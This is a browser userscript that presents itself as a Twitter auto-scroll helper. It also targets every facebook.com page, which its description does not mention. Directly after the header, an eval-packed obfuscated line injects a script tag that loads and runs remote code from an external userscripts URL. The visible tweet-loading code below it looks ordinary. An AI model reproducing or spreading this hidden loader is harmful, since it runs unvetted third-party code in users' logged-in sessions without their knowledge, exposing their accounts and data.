// ==UserScript==
// @name	Tweetscroll Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace	http://labs.rbardini.com/
// @description	Automatically show new tweets on Twitter web interface
// @author	Rafael Bardini
// @version	1.1
// @include	http://twitter.com/*
// @include	https://twitter.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


(function tweetscroll() {
	var _window = (typeof unsafeWindow !== 'undefined') ? unsafeWindow : window;
	if (typeof _window.jQuery === 'undefined') {
		window.setTimeout(tweetscroll, 200);
	} else {
		var $ = jQuery = _window.jQuery,
			hasFocus = true,
			isEnqueued = false;
		
		function show(el) {
			el.click();
			isEnqueued = false;
		}
		
		$('head').append('<style>.new-tweets-bar {display:none !important}</style>');

		$(window).on({
			'blur': function() { hasFocus = false; },
			'focus': function() { hasFocus = true; }
		});
		
		$(document).on('DOMNodeInserted', function(event) {
			var el = $(event.target);
			if (el.hasClass('stream-item')) {
				bar = el.children('.new-tweets-bar');
				if (bar.length) {
					if (hasFocus) { show(bar); }
					else if (!isEnqueued) {
						$(window).one('focus', function() { show(bar); });
						isEnqueued = true;
					}
				}
			}
		});
	}
})();
